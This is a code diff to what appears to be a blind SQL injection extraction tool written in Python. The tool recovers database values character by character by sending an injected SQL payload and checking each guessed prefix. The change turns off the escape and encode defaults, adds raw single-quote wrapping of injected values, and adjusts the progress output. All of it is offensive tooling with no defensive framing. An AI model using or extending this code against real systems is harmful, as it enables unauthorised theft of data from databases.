@@ -47,10 +47,10 @@ _CONFIG_SINGLE_VALUE_SEARCH = "single_value"
 _CONFIG_DEFAULT_SINGLE_VALUE_SEARCH = False
 
 _CONFIG_ESCAPE_VALUE = "escape_value"
-_CONFIG_DEFAULT_ESCAPE_VALUE = True
+_CONFIG_DEFAULT_ESCAPE_VALUE = False
 
 _CONFIG_ENCODE_VALUE = "encode_value"
-_CONFIG_DEFAULT_ENCODE_VALUE = True
+_CONFIG_DEFAULT_ENCODE_VALUE = False
 
 
 def _read_configurations():
@@ -114,6 +114,9 @@ def _call_with_value(config, search_value, is_exact, is_activation):
         search_value = ' || '.join(
             ['\'\\\' || encode(\'\\x' + format(ord(ch), 'x') + '\',\'escape\')' for ch in search_value])
 
+    else:
+        search_value = '\'' + search_value + '\''
+
     sql_payload = config.get(_CONFIG_SQL_PAYLOAD, _CONFIG_SQL_PAYLOAD_DEFAULT)
 
     if is_exact:
@@ -155,7 +158,7 @@ def _extract_data(config):
                 _logger.debug("Trying to see if {} is exact value".format(prefix))
                 if _call_with_value(config, prefix, True, False):
                     _logger.debug("Detected value {}".format(prefix))
-                    print('{}'.format(prefix), end='')
+                    print('\r{}'.format(prefix), end='\n')
                     detected_values.append(prefix)
 
             found_next = False
@@ -169,8 +172,7 @@ def _extract_data(config):
 
                 _logger.debug("Checking {}".format(prefix + ch))
 
-                if single_value:
-                    print('\r' + prefix + ch, end='')
+                print('\r' + prefix + ch, end='')
 
                 is_correct = _call_with_value(config, prefix + ch, False, False)
 
@@ -185,7 +187,6 @@ def _extract_data(config):
                         found_next = True
                     else:
                         _logger.debug("Detected valid prefix {}".format(prefix + ch))
-                        print('.', end='')
             if not found_next and single_value:
                 detected_values.append(prefix)
 
